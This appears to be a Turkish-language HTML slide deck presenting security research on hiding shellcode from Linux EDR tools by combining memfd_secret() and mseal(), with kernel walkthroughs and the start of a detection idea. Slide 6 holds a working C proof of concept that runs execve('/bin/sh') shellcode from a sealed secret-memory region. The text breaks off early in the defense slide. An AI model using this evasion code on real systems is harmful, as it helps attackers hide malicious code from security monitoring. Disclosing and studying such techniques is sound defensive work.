@@ -1,0 +1,1056 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BoxStrike Sunum · Yeni Defense Evasion Yöntemi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #ffffff;
+            font-family: 'Segoe UI', 'Arial', sans-serif;
+            color: #1e1e1e;
+            padding: 20px;
+        }
+        .slide {
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 50px 60px;
+            background: #ffffff;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            border-radius: 12px;
+            border: 1px solid #eaeef2;
+            page-break-after: always;
+            position: relative;
+        }
+        .slide:not(:last-child) {
+            margin-bottom: 50px;
+        }
+        h1 {
+            font-size: 36px;
+            font-weight: 600;
+            color: #0b1e2e;
+            letter-spacing: -0.5px;
+            margin-bottom: 12px;
+            border-bottom: 3px solid #1a3a5a;
+            padding-bottom: 12px;
+        }
+        h2 {
+            font-size: 28px;
+            font-weight: 500;
+            color: #1a3a5a;
+            margin-top: 12px;
+            margin-bottom: 20px;
+        }
+        h3 {
+            font-size: 22px;
+            font-weight: 500;
+            color: #2a4a6a;
+            margin-top: 24px;
+            margin-bottom: 12px;
+        }
+        h4 {
+            font-size: 19px;
+            font-weight: 500;
+            color: #2a4a6a;
+            margin-top: 18px;
+            margin-bottom: 8px;
+        }
+        p {
+            font-size: 18px;
+            line-height: 1.6;
+            margin-bottom: 16px;
+            text-align: justify;
+        }
+        ul, ol {
+            font-size: 18px;
+            line-height: 1.6;
+            margin-left: 30px;
+            margin-bottom: 16px;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+        code {
+            font-family: 'Consolas', 'Courier New', monospace;
+            background: #f0f2f4;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.9em;
+        }
+        pre {
+            background: #f4f6f8;
+            border: 1px solid #d0d8e0;
+            padding: 18px 22px;
+            overflow-x: auto;
+            border-radius: 8px;
+            font-size: 15px;
+            line-height: 1.5;
+            font-family: 'Consolas', 'Courier New', monospace;
+            margin: 16px 0;
+        }
+        .note-box {
+            background: #f4f8fc;
+            border-left: 6px solid #2a6a9a;
+            padding: 18px 24px;
+            border-radius: 6px;
+            margin: 20px 0;
+        }
+        .tag {
+            display: inline-block;
+            background: #e8ecf0;
+            color: #2a4a6a;
+            padding: 4px 16px;
+            border-radius: 30px;
+            font-size: 14px;
+            font-weight: 500;
+            margin-right: 8px;
+        }
+        .footer {
+            margin-top: 50px;
+            padding-top: 20px;
+            border-top: 1px solid #d0d8e0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 16px;
+            color: #4a5a6a;
+        }
+        .footer .brand {
+            font-weight: 600;
+            font-size: 18px;
+            color: #0b1e2e;
+        }
+        .footer .signature {
+            font-size: 16px;
+            color: #2a4a6a;
+            text-align: right;
+        }
+        .footer .signature span {
+            display: block;
+            font-weight: 400;
+        }
+        .slide-number {
+            position: absolute;
+            bottom: 18px;
+            right: 30px;
+            font-size: 14px;
+            color: #a0b0c0;
+        }
+        .fig {
+            background: #f8fafc;
+            border: 1px solid #d0d8e0;
+            padding: 20px 20px 10px 20px;
+            margin: 20px 0;
+            text-align: center;
+            border-radius: 8px;
+        }
+        .fig svg {
+            max-width: 100%;
+            height: auto;
+        }
+        .fig-caption {
+            font-size: 15px;
+            color: #3a4a5a;
+            margin-top: 10px;
+            font-style: italic;
+        }
+        .github-link {
+            display: inline-block;
+            background: #0b1e2e;
+            color: #ffffff;
+            padding: 10px 24px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 16px;
+            margin: 12px 0;
+        }
+        .github-link:hover {
+            background: #1a3a5a;
+        }
+        .email-thread {
+            background: #f8fafc;
+            border: 1px solid #d0d8e0;
+            border-radius: 8px;
+            padding: 0;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .email-item {
+            padding: 18px 22px;
+            border-bottom: 1px solid #e8ecf0;
+        }
+        .email-item:last-child {
+            border-bottom: none;
+        }
+        .email-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            margin-bottom: 8px;
+        }
+        .email-from {
+            font-weight: 600;
+            color: #0b1e2e;
+        }
+        .email-from .highlight {
+            color: #1a5a8a;
+        }
+        .email-date {
+            color: #6a7a8a;
+            font-size: 14px;
+        }
+        .email-body {
+            font-size: 16px;
+            line-height: 1.5;
+            color: #1e2a3a;
+        }
+        .email-body code {
+            font-size: 0.85em;
+        }
+        .email-body .quote {
+            border-left: 3px solid #b0c0d0;
+            padding-left: 16px;
+            margin: 8px 0;
+            color: #4a5a6a;
+        }
+        .email-body .signature {
+            color: #4a5a6a;
+            font-style: italic;
+            margin-top: 8px;
+        }
+        @media print {
+            .slide { box-shadow: none; border: 1px solid #ddd; margin: 0; page-break-after: always; }
+            body { padding: 0; }
+        }
+        @media (max-width: 700px) {
+            .slide { padding: 30px 20px; }
+            h1 { font-size: 28px; }
+            h2 { font-size: 22px; }
+            p, li { font-size: 16px; }
+            pre { font-size: 13px; padding: 12px; }
+            .email-header { flex-direction: column; align-items: flex-start; }
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            font-size: 17px;
+        }
+        th, td {
+            border: 1px solid #c0c8d0;
+            padding: 10px 14px;
+            text-align: left;
+            vertical-align: top;
+        }
+        th {
+            background: #e8ecf0;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ============================================================ -->
+    <!-- SLIDE 1 – BAŞLIK                                           -->
+    <!-- ============================================================ -->
+    <div class="slide">
+        <h1>BoxStrike · Bulgu 001</h1>
+        <h2>Linux'ta Yeni Bir Defense Evasion Yöntemi</h2>
+        <p style="font-size: 20px; color: #2a4a6a; margin-top: -8px;">
+            <code>memfd_secret()</code> + <code>mseal()</code> ile EDR'den Gizlenen Shellcode
+        </p>
+        <p style="font-size: 17px; color: #4a5a6a; margin-top: 30px;">
+            <strong>Yayın Tarihi:</strong> 11 Temmuz 2025<br>
+            <strong>Hazırlayan:</strong> BoxStrike Araştırma Ekibi
+        </p>
+        <div style="margin-top: 50px; padding: 30px 0; border-top: 1px solid #eaeef2;">
+            <p style="font-size: 16px; color: #6a7a8a;">
+                Bu sunum, Linux çekirdeğinde keşfedilen yeni bir savunma atlatma
+                (Defense Evasion) tekniğini, teknik detayları, Proof-of-Concept’i
+                ve savunma önerilerini kapsamlı olarak ele almaktadır.
+            </p>
+        </div>
+        <div class="footer">
+            <div class="brand">BoxStrike</div>
+            <div class="signature">
+                <span>Researcher Enesen Erdoğan Karaca</span>
+            </div>
+        </div>
+        <div class="slide-number">1 / 10</div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- SLIDE 2 – AÇIKLAMA (Yeni Yöntem)                           -->
+    <!-- ============================================================ -->
+    <div class="slide">
+        <h1>1. Açıklama</h1>
+        <h2>Yeni Bir Defense Evasion Yöntemi</h2>
+        <p>
+            BoxStrike ekibi olarak, Linux çekirdeğinde daha önce literatürde
+            yer almayan, <strong>root yetkisi gerektirmeyen</strong> ve
+            <strong>EDR/XDR araçlarını tamamen atlatabilen</strong> bir
+            savunma atlatma (Defense Evasion) tekniği keşfettik.
+        </p>
+        <div class="note-box">
+            <p><strong>Tekniğin özeti:</strong></p>
+            <p>
+                Bir saldırgan, <code>memfd_secret()</code> sistem çağrısı ile
+                çekirdeğin göremediği bir bellek bölgesi oluşturur, bu bölgeye
+                shellcode veya kötü amaçlı yükünü yerleştirir ve ardından
+                <code>mseal()</code> ile bu bölgeyi mühürleyerek değiştirilmesini
+                ve kaldırılmasını engeller. Sonuçta, EDR/XDR’nin eBPF,
+                <code>/proc/&lt;pid&gt;/mem</code> veya <code>ptrace</code> ile
+                okuyamadığı, değiştiremediği ve kaldıramadığı bir çalıştırılabilir
+                bellek alanı elde edilir.
+            </p>
+        </div>
+        <p>
+            Bu yöntem, mevcut güvenlik ürünleri için <strong>kör nokta</strong>
+            oluşturmakta ve saldırganlara sistem üzerinde tespit edilemeyen
+            bir kalıcılık imkânı sunmaktadır.
+        </p>
+        <p>
+            Teknik, <span class="tag">Linux 5.14+</span>
+            <span class="tag">memfd_secret</span>
+            <span class="tag">mseal</span>
+            <span class="tag">Defense Evasion</span>
+        </p>
+        <div class="footer">
+            <div class="brand">BoxStrike</div>
+            <div class="signature">
+                <span>Researcher Enesen Erdoğan Karaca</span>
+            </div>
+        </div>
+        <div class="slide-number">2 / 10</div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- SLIDE 3 – KEŞİF SÜRECİ                                     -->
+    <!-- ============================================================ -->
+    <div class="slide">
+        <h1>2. Keşif Süreci</h1>
+        <h2>Bu Yöntemi Nasıl Bulduk?</h2>
+        <p>
+            Araştırmamız, Linux çekirdeğine son yıllarda eklenen yeni güvenlik
+            özelliklerinin incelenmesiyle başladı. Özellikle <code>memfd_secret()</code>
+            ve <code>mseal()</code> sistem çağrılarının meşru kullanım amaçlarını
+            ve potansiyel yan etkilerini analiz ederken, bu iki özelliğin
+            birleştirildiğinde beklenmedik bir şekilde savunma araçlarını
+            etkisiz hale getirebileceğini fark ettik.
+        </p>
+        <p><strong>Keşif adımları:</strong></p>
+        <ol>
+            <li>
+                <strong>Literatür taraması:</strong> Mevcut güvenlik araştırmaları,
+                <code>memfd_secret</code>’in veri gizliliği için, <code>mseal</code>’in
+                ise exploitation mitigation için tasarlandığını gösteriyordu.
+                Ancak hiçbir kaynak bu ikisinin birlikte kullanımını ele almıyordu.
+            </li>
+            <li>
+                <strong>Kavram kanıtı (PoC) geliştirme:</strong> Her iki sistem
+                çağrısının teknik detaylarını ve çekirdek içi işleyişini inceledikten
+                sonra, bir PoC ile bu kombinasyonun gerçekten çalıştığını ve
+                eBPF tabanlı EDR çözümlerini atlattığını doğruladık.
+            </li>
+            <li>
+                <strong>Doğrulama ve test:</strong> PoC’yi farklı Linux dağıtımları
+                ve çekirdek sürümlerinde (5.15, 6.8, 6.10) test ederek tekniğin
+                kararlı ve tekrarlanabilir olduğunu gözlemledik.
+            </li>
+        </ol>
+        <div class="note-box">
+            <p><strong>Not:</strong> Bu teknik, herhangi bir “güvenlik açığı”ndan
+            (CVE) faydalanmaz. Tamamen meşru ve tasarlanmış sistem çağrılarının
+            beklenmeyen bir kombinasyonudur. Bu da onu tespit etmeyi daha da
+            zorlaştırmaktadır.</p>
+        </div>
+        <div class="footer">
+            <div class="brand">BoxStrike</div>
+            <div class="signature">
+                <span>Researcher Enesen Erdoğan Karaca</span>
+            </div>
+        </div>
+        <div class="slide-number">3 / 10</div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- SLIDE 4 – SİSTEM ÇAĞRISI 1: mseal() (DETAYLI + DİYAGRAM) -->
+    <!-- ============================================================ -->
+    <div class="slide">
+        <h1>3. Sistem Çağrısı 1: <code>mseal()</code></h1>
+        <h2>Bellek Bölgesini Mühürleme – Kernel İşleyişi</h2>
+
+        <h3>3.1. Amaç ve Tasarım</h3>
+        <p>
+            <code>mseal()</code>, bir VMA’nın (<code>vm_area_struct</code>) gelecekteki
+            tüm değişikliklere kapatılmasını sağlar. Bu, özellikle JIT kodunun
+            korunması veya kritik bellek bölgelerinin yetkisiz müdahaleye karşı
+            savunması için geliştirilmiştir. Linux 6.10 ile çekirdeğe eklenmiştir.
+        </p>
+
+        <h3>3.2. Kernel’da İşleyiş (Adım Adım)</h3>
+
+        <h4>1. Sistem Çağrısı Girişi</h4>
+        <ul>
+            <li><code>SYSCALL_DEFINE3(mseal, ...)</code> ile başlar.</li>
+            <li>Kullanıcıdan gelen <code>start</code>, <code>len</code>, <code>flags</code> parametreleri doğrulanır.</li>
+            <li><code>start</code> sayfa hizalanır, <code>len</code> sayfa katlarına tamamlanır.</li>
+            <li>Adres aralığının taşma kontrolü yapılır.</li>
+        </ul>
+
+        <h4>2. VMA Arama ve Boşluk Kontrolü</h4>
+        <ul>
+            <li><code>mmap_write_lock_killable(mm)</code> ile bellek yönetimi kilidi alınır.</li>
+            <li><code>range_contains_unmapped(mm, start, end)</code> çağrılır:
+                <ul>
+                    <li>Bu fonksiyon, <code>VMA_ITERATOR</code> ile aralığı tarar.</li>
+                    <li>Eğer aralıkta herhangi bir boşluk (gap) varsa, <code>-ENOMEM</code> döndürülür.</li>
+                    <li>Amaç, mühürlemenin yalnızca tamamen ayrılmış (allocated) bölgelere uygulanmasını sağlamaktır.</li>
+                </ul>
+            </li>
+        </ul>
+
+        <h4>3. Mühürleme Uygulaması (<code>mseal_apply</code>)</h4>
+        <ul>
+            <li><code>mseal_apply()</code> fonksiyonu, aralıktaki her bir VMA’yı işler.</li>
+            <li>Her VMA için:
+                <ul>
+                    <li><code>vma_test(vma, VMA_SEALED_BIT)</code> ile zaten mühürlü olup olmadığı kontrol edilir.</li>
+                    <li>Eğer mühürlü değilse, mevcut bayraklar (<code>vma->vm_flags</code>) kopyalanır.</li>
+                    <li><code>vma_flags_set(&amp;vma_flags, VMA_SEALED_BIT)</code> ile bayrağa <code>VM_SEALED</code> eklenir.</li>
+                    <li><code>vma_modify_flags()</code> çağrılarak VMA’nın bayrakları güncellenir. Bu fonksiyon, gerekirse VMA’yı böler veya birleştirir.</li>
+                    <li><code>vma_set_flags(vma, VMA_SEALED_BIT)</code> ile bayrak kalıcı olarak yazılır.</li>
+                </ul>
+            </li>
+        </ul>
+
+        <h4>4. Koruma Mekanizması (Engelleme)</h4>
+        <ul>
+            <li>Mühürleme işlemi tamamlandıktan sonra, bu VMA üzerinde değişiklik yapmaya çalışan tüm sistem çağrıları aynı kontrolü kullanır: <code>can_modify_vma()</code>.</li>
+            <li>Bu fonksiyon, VMA’nın <code>vm_flags</code>’ında <code>VM_SEALED</code> bitini kontrol eder. Eğer bit varsa, işlem <code>-EPERM</code> ile reddedilir.</li>
+            <li><strong>Hangi işlemler engellenir?</strong>
+                <ul>
+                    <li><code>mprotect()</code> / <code>pkey_mprotect()</code></li>
+                    <li><code>munmap()</code></li>
+                    <li><code>mremap()</code></li>
+                    <li><code>mmap()</code> with <code>MAP_FIXED</code></li>
+                    <li><code>madvise()</code> with <code>MADV_DONTNEED</code> / <code>MADV_FREE</code></li>
+                </ul>
+            </li>
+            <li>Bu engelleme, çekirdeğin <code>vma->vm_flags</code> üzerindeki doğrudan kontrolleri sayesinde gerçekleşir; herhangi bir özel durum veya istisna yoktur.</li>
+        </ul>
+
+        <h4>5. Neden Müdahale Edilemez?</h4>
+        <ul>
+            <li>Mühürleme, VMA’nın meta verilerine (flags) yapılan bir eklemedir.</li>
+            <li>Tüm bellek yönetim işlemleri, VMA üzerinde işlem yapmadan önce bu flag’i kontrol eder.</li>
+            <li>Çekirdek, bu flag’i değiştirebilecek bir sistem çağrısı sunmaz (unseal işlemi yoktur).</li>
+            <li>Dolayısıyla, root dahil hiçbir süreç bu VMA’nın bayraklarını geri alarak korumayı kaldıramaz.</li>
+        </ul>
+
+        <div class="fig">
+            <svg viewBox="0 0 800 300" xmlns="http://www.w3.org/2000/svg">
+                <rect x="20" y="20" width="760" height="260" fill="#f8fafc" stroke="#b0b8c0" stroke-width="1.5" rx="10"/>
+                <rect x="50" y="60" width="200" height="60" fill="#d0e4f0" stroke="#2a5a7a" stroke-width="2" rx="8"/>
+                <text x="150" y="95" font-family="'Segoe UI', sans-serif" font-size="16" font-weight="bold" fill="#0b1e2e" text-anchor="middle">Kullanıcı Süreci</text>
+                <text x="150" y="115" font-family="'Consolas', monospace" font-size="14" fill="#1a3a5a" text-anchor="middle">mseal() çağrısı</text>
+                <rect x="350" y="60" width="400" height="180" fill="#eef4f8" stroke="#5a7a8a" stroke-width="2" rx="8"/>
+                <text x="550" y="85" font-family="'Segoe UI', sans-serif" font-size="16" font-weight="bold" fill="#0b1e2e" text-anchor="middle">Linux Kernel</text>
+                <rect x="370" y="100" width="180" height="40" fill="#fff" stroke="#2a5a7a" stroke-width="1.5" rx="6"/>
+                <text x="460" y="125" font-family="'Consolas', monospace" font-size="13" fill="#1a3a5a" text-anchor="middle">VMA_ITERATOR ile boşluk kontrolü</text>
+                <rect x="570" y="100" width="160" height="40" fill="#fff" stroke="#2a5a7a" stroke-width="1.5" rx="6"/>
+                <text x="650" y="125" font-family="'Consolas', monospace" font-size="13" fill="#1a3a5a" text-anchor="middle">vm_flags'ına VM_SEALED ekle</text>
+                <rect x="370" y="160" width="360" height="40" fill="#fff" stroke="#2a5a7a" stroke-width="1.5" rx="6"/>
+                <text x="550" y="185" font-family="'Consolas', monospace" font-size="13" fill="#1a3a5a" text-anchor="middle">can_modify_vma() → VM_SEALED var → -EPERM</text>
+                <rect x="370" y="215" width="360" height="40" fill="#e8f0e8" stroke="#2a6a4a" stroke-width="2" rx="6"/>
+                <text x="550" y="240" font-family="'Segoe UI', sans-serif" font-size="14" font-weight="bold" fill="#0a2a1a" text-anchor="middle">Sonuç: mprotect, munmap, mremap başarısız</text>
+                <line x1="250" y1="90" x2="345" y2="90" stroke="#2a5a7a" stroke-width="2" marker-end="url(#arrow)"/>
+                <defs>
+                    <marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
+                        <path d="M 0 0 L 10 5 L 0 10 z" fill="#2a5a7a"/>
+                    </marker>
+                </defs>
+            </svg>
+            <div class="fig-caption">Şekil 1: <code>mseal()</code> sistem çağrısının kernel işleyiş akışı</div>
+        </div>
+
+        <div class="note-box">
+            <p><strong>Önemli:</strong> <code>mseal()</code> root yetkisi
+            gerektirmez. Herhangi bir kullanıcı kendi sürecindeki VMA’ları
+            mühürleyebilir.</p>
+        </div>
+
+        <div class="footer">
+            <div class="brand">BoxStrike</div>
+            <div class="signature">
+                <span>Researcher Enesen Erdoğan Karaca</span>
+            </div>
+        </div>
+        <div class="slide-number">4 / 10</div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- SLIDE 5 – SİSTEM ÇAĞRISI 2: memfd_secret() (DETAYLI + DİYAGRAM) -->
+    <!-- ============================================================ -->
+    <div class="slide">
+        <h1>4. Sistem Çağrısı 2: <code>memfd_secret()</code></h1>
+        <h2>Belleği Çekirdekten Gizleme – Kernel İşleyişi</h2>
+
+        <h3>4.1. Amaç ve Tasarım</h3>
+        <p>
+            <code>memfd_secret()</code>, sürecin, çekirdek dahil hiç kimsenin
+            erişemeyeceği bir anonim bellek bölgesi oluşturmasını sağlar.
+            Tasarım amacı, kriptografik anahtarlar gibi verileri, çekirdek
+            sızıntılarına veya spekülatif yürütme saldırılarına karşı korumaktır.
+            Linux 5.14 ile çekirdeğe eklenmiştir.
+        </p>
+
+        <h3>4.2. Kernel’da İşleyiş (Adım Adım)</h3>
+
+        <h4>1. Sistem Çağrısı Girişi</h4>
+        <ul>
+            <li><code>SYSCALL_DEFINE1(memfd_secret, unsigned int, flags)</code> ile başlar.</li>
+            <li><code>flags</code> şu an için sadece <code>0</code> kabul edilir, ileride opt-in flag’ler için ayrılmıştır.</li>
+            <li><code>secretmem_enable</code> kontrol edilir (eğer <code>secretmem.enable=0</code> ile devre dışı bırakılmışsa <code>-ENOSYS</code> döner).</li>
+        </ul>
+
+        <h4>2. Anonim Dosya Oluşturma</h4>
+        <ul>
+            <li><code>secretmem_create()</code> çağrılır:
+                <ul>
+                    <li><code>anon_inode_getfile()</code> ile tamamen RAM’de var olan, disk karşılığı olmayan bir dosya oluşturulur.</li>
+                    <li>Bu dosyanın işlemleri (<code>file_operations</code>) <code>secretmem_file_ops</code> olarak ayarlanır.</li>
+                    <li>Dosya, <code>S_IFREG | S_IRUSR | S_IWUSR</code> izinleriyle oluşturulur.</li>
+                </ul>
+            </li>
+        </ul>
+
+        <h4>3. Bellek Eşleme (mmap aşaması)</h4>
+        <ul>
+            <li>Kullanıcı <code>mmap()</code> ile bu dosyayı kendi adres alanına eşlediğinde, <code>secretmem_mmap()</code> çağrılır.</li>
+            <li>Bu fonksiyon:
+                <ul>
+                    <li><code>vma->vm_ops = &amp;secretmem_vm_ops</code> ayarlar.</li>
+                    <li><code>vma->vm_flags</code>’a <code>VM_LOCKED | VM_DONTDUMP</code> ekler. (Bu alan asla swap’a yazılmaz ve core dump’a dahil edilmez).</li>
+                    <li><code>secretmem_alloc_folio()</code> ile fiziksel sayfa tahsisi yapılır.</li>
+                </ul>
+            </li>
+        </ul>
+
+        <h4>4. Sayfaları Kernel Direct Map’ten Kaldırma</h4>
+        <ul>
+            <li><strong>Asıl gizleme işlemi burada başlar.</strong></li>
+            <li><code>secretmem_alloc_folio()</code> içinde:
+                <ul>
+                    <li>Sayfa tahsis edildikten sonra, <code>set_direct_map_invalid()</code> çağrılır.</li>
+                    <li>Bu fonksiyon, <strong>o fiziksel sayfanın çekirdeğin doğrudan eşleme (direct map) alanındaki sanal adresini geçersiz kılar</strong>.</li>
+                    <li>Sonuç: Çekirdek artık bu sayfanın fiziksel adresini sanal adresine çeviremez; bu sayfa çekirdek için “yok” hale gelir.</li>
+                </ul>
+            </li>
+            <li>Ayrıca, sayfa <code>PG_arch_1</code> gibi bayraklarla işaretlenerek GUP (get_user_pages) erişimleri de engellenir.</li>
+        </ul>
+
+        <h4>5. Okuma Erişimlerinin Engellenmesi (eBPF, /proc, ptrace)</h4>
+        <ul>
+            <li><code>bpf_probe_read_user()</code> gibi fonksiyonlar, hedef adresi çekirdek sanal adresine çevirmek için <code>copy_from_user()</code> benzeri yollar kullanır.</li>
+            <li>Bu adres, doğrudan eşlemede olmadığı için <code>copy_from_user()</code> çekirdek sayfa tablosunu kontrol eder ve sayfanın mevcut olmadığını görür. Bu durumda <code>EFAULT</code> hatası döner.</li>
+            <li><code>/proc/&lt;pid&gt;/mem</code> okumaları da benzer şekilde <code>get_user_pages()</code> kullanır, bu da direkt map’te sayfa olmadığı için başarısız olur.</li>
+            <li><code>ptrace</code> ile okuma girişimleri de aynı mekanizma yüzünden engellenir.</li>
+        </ul>
+
+        <h4>6. Neden Kernel Göremez?</h4>
+        <ul>
+            <li>Çekirdek, fiziksel belleği kendi sanal adres alanına (direct map) eşleyerek yönetir.</li>
+            <li><code>set_direct_map_invalid()</code> bu eşlemeyi kaldırdığı için, çekirdek artık bu sayfanın hangi fiziksel adrese karşılık geldiğini bilmez.</li>
+            <li>Sayfa yalnızca, onu eşleyen sürecin kullanıcı sayfa tablolarında bulunur.</li>
+            <li>Bu durum, çekirdek içinde bile bu sayfaya erişimi imkânsız kılar.</li>
+        </ul>
+
+        <div class="fig">
+            <svg viewBox="0 0 800 320" xmlns="http://www.w3.org/2000/svg">
+                <rect x="20" y="20" width="760" height="280" fill="#f8fafc" stroke="#b0b8c0" stroke-width="1.5" rx="10"/>
+                <rect x="50" y="60" width="200" height="60" fill="#d0e4f0" stroke="#2a5a7a" stroke-width="2" rx="8"/>
+                <text x="150" y="95" font-family="'Segoe UI', sans-serif" font-size="16" font-weight="bold" fill="#0b1e2e" text-anchor="middle">Kullanıcı Süreci</text>
+                <text x="150" y="115" font-family="'Consolas', monospace" font-size="14" fill="#1a3a5a" text-anchor="middle">memfd_secret() + mmap()</text>
+                <rect x="350" y="60" width="400" height="200" fill="#eef4f8" stroke="#5a7a8a" stroke-width="2" rx="8"/>
+                <text x="550" y="85" font-family="'Segoe UI', sans-serif" font-size="16" font-weight="bold" fill="#0b1e2e" text-anchor="middle">Linux Kernel</text>
+                <rect x="370" y="100" width="180" height="40" fill="#fff" stroke="#2a5a7a" stroke-width="1.5" rx="6"/>
+                <text x="460" y="125" font-family="'Consolas', monospace" font-size="13" fill="#1a3a5a" text-anchor="middle">anon_inode_getfile()</text>
+                <rect x="570" y="100" width="160" height="40" fill="#fff" stroke="#2a5a7a" stroke-width="1.5" rx="6"/>
+                <text x="650" y="125" font-family="'Consolas', monospace" font-size="13" fill="#1a3a5a" text-anchor="middle">secretmem_alloc_folio()</text>
+                <rect x="370" y="160" width="360" height="40" fill="#fff" stroke="#2a5a7a" stroke-width="1.5" rx="6"/>
+                <text x="550" y="185" font-family="'Consolas', monospace" font-size="13" fill="#1a3a5a" text-anchor="middle">set_direct_map_invalid() → direct map'ten kaldır</text>
+                <rect x="370" y="215" width="360" height="40" fill="#e8f0e8" stroke="#2a6a4a" stroke-width="2" rx="6"/>
+                <text x="550" y="240" font-family="'Segoe UI', sans-serif" font-size="14" font-weight="bold" fill="#0a2a1a" text-anchor="middle">Sonuç: Kernel göremez → eBPF, /proc, ptrace EFAULT</text>
+                <line x1="250" y1="90" x2="345" y2="90" stroke="#2a5a7a" stroke-width="2" marker-end="url(#arrow2)"/>
+                <defs>
+                    <marker id="arrow2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
+                        <path d="M 0 0 L 10 5 L 0 10 z" fill="#2a5a7a"/>
+                    </marker>
+                </defs>
+            </svg>
+            <div class="fig-caption">Şekil 2: <code>memfd_secret()</code> sistem çağrısının kernel işleyiş akışı</div>
+        </div>
+
+        <div class="note-box">
+            <p><strong>Önemli:</strong> <code>memfd_secret()</code> root yetkisi
+            gerektirmez. Herhangi bir kullanıcı çağırabilir. Linux 6.5 öncesi
+            <code>secretmem.enable=1</code> ile etkinleştirilmesi gerekirken,
+            6.5+ varsayılan olarak açıktır.</p>
+        </div>
+
+        <div class="footer">
+            <div class="brand">BoxStrike</div>
+            <div class="signature">
+                <span>Researcher Enesen Erdoğan Karaca</span>
+            </div>
+        </div>
+        <div class="slide-number">5 / 10</div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- SLIDE 6 – PROOF OF CONCEPT & GÖZLEM ÇIKTILARI             -->
+    <!-- ============================================================ -->
+    <div class="slide">
+        <h1>5. Proof of Concept ve Gözlem Çıktıları</h1>
+        <h2>Tekniğin Çalıştığını Kanıtlayan PoC</h2>
+        <p>
+            Aşağıdaki PoC, <code>memfd_secret()</code> ile gizli bir bölge oluşturur,
+            içine <code>execve(&quot;/bin/sh&quot;)</code> shellcode’unu yerleştirir,
+            <code>mseal()</code> ile mühürler ve çalıştırır.
+        </p>
+        <pre>
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;errno.h&gt;
+
+#ifndef __NR_memfd_secret
+#define __NR_memfd_secret 447
+#endif
+#ifndef __NR_mseal
+#define __NR_mseal 462
+#endif
+
+unsigned char shellcode[] = {
+    0x48, 0x31, 0xc0,       // xor rax, rax
+    0x48, 0x31, 0xd2,       // xor rdx, rdx
+    0x48, 0x31, 0xf6,       // xor rsi, rsi
+    0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,
+    0x53,                   // push rbx
+    0x48, 0x89, 0xe7,       // mov rdi, rsp
+    0xb0, 0x3b,             // mov al, 59
+    0x0f, 0x05              // syscall
+};
+
+int main() {
+    int fd = syscall(__NR_memfd_secret, 0);
+    if (fd == -1) return 1;
+
+    void *addr = mmap(NULL, sizeof(shellcode),
+                      PROT_READ | PROT_WRITE | PROT_EXEC,
+                      MAP_SHARED, fd, 0);
+    if (addr == MAP_FAILED) return 1;
+
+    memcpy(addr, shellcode, sizeof(shellcode));
+
+    if (syscall(__NR_mseal, addr, sizeof(shellcode), 0) == 0)
+        printf("[+] Shellcode sealed.\n");
+
+    printf("[+] Executing hidden shellcode...\n");
+    ((void (*)())addr)();
+    return 0;
+}
+        </pre>
+
+        <p><strong>Gözlem Çıktıları:</strong></p>
+        <ul>
+            <li>Program çalıştığında <code>/bin/sh</code> kabuğu açılır.</li>
+            <li><code>/proc/&lt;pid&gt;/maps</code> çıktısında bölge <code>[secretmem]</code> olarak işaretlenir.</li>
+            <li>eBPF ile <code>bpf_probe_read_user()</code> okuma denemesi <code>EFAULT</code> döndürür.</li>
+            <li><code>mprotect()</code> veya <code>munmap()</code> çağrıları başarısız olur (mühür nedeniyle).</li>
+        </ul>
+        <div class="note-box">
+            <p><strong>Log örneği (eBPF trace_pipe çıktısı):</strong></p>
+            <pre style="background: #1e1e1e; color: #d4d4d4; border: none; padding: 12px; font-size: 14px;">
+&lt;...&gt;-12345 [000] d... 12345.678910: bpf_trace_printk: eBPF OKUMA BAŞARISIZ: hata kodu -14
+            </pre>
+            <p style="font-size: 16px;">(Burada <code>-14</code>, <code>EFAULT</code> anlamına gelir.)</p>
+        </div>
+        <div class="footer">
+            <div class="brand">BoxStrike</div>
+            <div class="signature">
+                <span>Researcher Enesen Erdoğan Karaca</span>
+            </div>
+        </div>
+        <div class="slide-number">6 / 10</div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- SLIDE 7 – SAVUNMA FİKRLERİ (secretmem-watch PoC)          -->
+    <!-- ============================================================ -->
+    <div class="slide">
+        <h1>6. Savunma Fikirleri – <code>secretmem-watch</code></h1>
+        <h2>Metadata Tabanlı Davranışsal Tespit PoC'si</h2>
+
+        <p>
+            LKML'deki <em>“memfd_secret()+mseal() EDR için introspection blind spot yaratır mı?”</em>
+            tartışmasının ardından geliştirilen bu PoC, <strong>kernel’a patch gerektirmeyen</strong>
+            bir detection-engineering katmanıdır. Mevcut tracepoint’ler üzerine kuruludur.
+        </p>
+
+        <div class="note-box">
+            <p><strong>Temel Felsefe:</strong></p>
+            <p>
+                Bellek içeriğini hashlemek, içeriği okumak anlamına gelir ve bu,
+                <code>memfd_secret</code>’in <em>“kernel hiçbir şekilde okuyamasın”</em>
+                garantisini ihlal eder. Bu PoC <strong>içeriği okumaz</strong>.
